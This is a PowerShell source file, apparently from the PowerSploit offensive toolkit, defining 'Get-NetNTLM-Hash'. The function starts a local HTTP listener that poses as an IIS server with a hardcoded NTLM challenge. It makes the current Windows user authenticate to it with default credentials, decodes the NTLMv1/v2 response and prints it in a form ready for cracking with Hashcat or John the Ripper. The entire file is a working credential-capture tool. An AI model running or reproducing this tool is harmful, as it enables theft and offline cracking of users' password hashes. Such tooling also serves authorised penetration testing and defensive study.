function Get-NetNTLM-Hash {
<#
.SYNOPSIS
    Retrieves the current user NetNTLM hash by authentication against an embedded HTTP-server.    
    PowerSploit Function: Get-NetNTLM-Hash
    Author: Erlend Leiknes / https://www.mnemonic.io
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION
    Get-NetNTLM-Hash makes the current user authenticate against an embedded HTTP-server and returns the NetNTLM(v2) hash
    This hash can be cracked in tools such as Hashcat or John-The-Ripper to find the corresponding plaintext  
.EXAMPLE
    PS C:\> Get-NetNTLM-Hash
    Administrator::desktop:1122334455667788:4FFFB35....F18337AB10:0101000000000000BD526...4006F0072006D000000000000000000
#>

$NetNTLM_ScriptBlock = {
    param ($port)

    function Decode-NTLM {
        param
        (
            [byte[]]$NTLM
        )
    
        $LMHash_len = [bitconverter]::ToInt16($NTLM,12)
        $LMHash_offset = [bitconverter]::ToInt16($NTLM,16)
        $LMHash = $NTLM[$LMHash_offset..($LMHash_offset+$LMHash_len-1)]
        $NTHash_len = [bitconverter]::ToInt16($NTLM,20)
        $NTHash_offset = [bitconverter]::ToInt16($NTLM,24)
        [byte[]]$NTHash = $NTLM[$NTHash_offset..($NTHash_offset+$NTHash_len-1)]
        $User_len = [bitconverter]::ToInt16($NTLM,36)
        $User_offset = [bitconverter]::ToInt16($NTLM,40)
        $User = $NTLM[$User_offset..($User_offset+$User_len-1)]
        $User = [System.Text.Encoding]::Unicode.GetString($User)
        if ($NTHash_len -eq 24) { # NTLMv1
            $HostName_len = [bitconverter]::ToInt16($NTLM,46)
            $HostName_offset = [bitconverter]::ToInt16($NTLM,48)
            $HostName = $NTLM[$HostName_offset..($HostName_offset+$HostName_len-1)]
            $retval = $User+"::"+$HostName+":"+$LMHash+":"+$NTHash+":1122334455667788"        
            return $retval
        } elseif ($NTHash_len -gt 24) { # NTLMv2
            $NTHash_len = 64                    
            $Domain_len = [bitconverter]::ToInt16($NTLM,28)
            $Domain_offset = [bitconverter]::ToInt16($NTLM,32)
            $Domain = $NTLM[$Domain_offset..($Domain_offset+$Domain_len-1)]
            $Domain = [System.Text.Encoding]::Unicode.GetString($Domain)
            $HostName_len = [bitconverter]::ToInt16($NTLM,44)
            $HostName_offset = [bitconverter]::ToInt16($NTLM,48)
            $HostName = $NTLM[$HostName_offset..($HostName_offset+$HostName_len-1)]
                    
            $HostName = [System.Text.Encoding]::Unicode.GetString($HostName)
            $NTHash_part1 = [System.BitConverter]::ToString($NTHash[0..15]).Replace("-","")
            $NTHash_part2 = [System.BitConverter]::ToString($NTHash[16..$NTLM.Length]).Replace("-","")
            $retval = $User+"::"+$Domain+":1122334455667788:"+$NTHash_part1+":"+$NTHash_part2
            return $retval
        }
        Write-Error "Could not parse NTLM hash"
 
    }


    function Handle-WebRequest {  

        param
        (
            [string]$method, [string]$uri, [string]$httpversion, [hashtable]$headers, [string]$body
        )
        if ($headers.Contains("authorization") -eq 0) {
            return "HTTP/1.0 401 Unauthorized`r`nServer: Microsoft-IIS/6.0`r`nContent-Type: text/html`r`nWWW-Authenticate: NTLM`r`nX-Powered-By: ASP.NET`r`nConnection: Close`r`nContent-Length: 0`r`n`r`n"
        } elseif ($headers.Contains("authorization")) {        
            [string[]]$auth = $headers["authorization"].split()
            if ($auth[0] -eq "NTLM") {
                $auth[1] = $auth[1].TrimStart()
                [byte[]] $NTLMHash = [System.Convert]::FromBase64String($auth[1])
                if ($NTLMHash[8] -eq 3) {
                    [string]$NTLMHash = Decode-NTLM($NTLMHash)                            
                    return "HTTP/1.1 200 OK`r`n`r`n"+$NTLMHash+"`r`n"
                }
            }

            # NTLM Challenge Response
            return "HTTP/1.1 401 Unauthorized`r`nServer: Microsoft-IIS/6.0`r`nContent-Type: text/html`r`nWWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==`r`nConnection: Close`r`nContent-Length: 0`r`n`r`n"
        }
    }   

    function Start-HashServer {
        [CmdletBinding()]
        param
        (
           [int]$port
        )
        $foundPort = $false
        while (!$foundPort) {
            trap [System.Net.Sockets.SocketException] {                    
                $port = $port + 1               
                continue;
            }    
            $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Loopback,$port)
            $listener.Start()
            $foundPort = $true
        }
        $doexit = 0
        do {
            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            [System.IO.StreamReader]$reader = new-object System.IO.StreamReader -argumentList $stream
            [System.IO.StreamWriter]$writer = new-object System.IO.StreamWriter -argumentList $stream
            $state = 0
            $method = ""
            $uri = ""
            $httpver = ""
            $requestFinished = 0
            $headers = @{}

            while ($requestFinished -eq 0) {
                if ($state -eq 0) {                
                    $line = $reader.ReadLine()
                    $line = $line.split(" ")
                    [string]$method = $line[0]
                    [string]$uri = $line[1]
                    [string]$httpver = $line[2]
                    $state = 1
                } elseif ($state -eq 1) {
                    $line = $reader.ReadLine()
                    if ($line -eq "") {
                        # End of web request                                                                                  
                        $requestFinished = 1                            
                        $response = Handle-WebRequest -method $method -uri $uri -httpversion $httpver -headers $headers -body $body
                        if ($response -like "HTTP/1.1 200 OK*") {
                            $doexit = 1
                        }
                        $writer.Write($response -join(''))
                        $writer.Flush()
                        $client.Close()                                                                                
                    } else {
                        $line = $line.Split(":")
                        $key = $line[0].Trim().ToLower()
                        $val = $line[1].TrimStart()
                        $headers.Add($key,$val)
                    }
                }
            }


        }  while ($doexit -eq 0) 
        $listener.stop()
    }
    Start-HashServer -port $port
}

    # Find available port
    $random = New-Object System.Random   
    $takenPorts = Get-NetTCPConnection -LocalAddress 127.0.0.1
    $port = 0  
    while (!$port) {
        $port = $random.Next(1025,65535)
        foreach ($takenPort in $takenPorts) {
            if ($port -eq $takenPort.Localport) {
                $port = 0
            }
            
        }
    }    
    # Start local http server in background
    $job = Start-Job -ScriptBlock $NetNTLM_ScriptBlock -ArgumentList $port
    
    # Request the NTLM hash from local http server
    Invoke-WebRequest -uri http://localhost:$port -UseDefaultCredentials | Write-Host  

    # Cleanup
    Stop-Job -Job $job
    Remove-Job -Job $job    
}
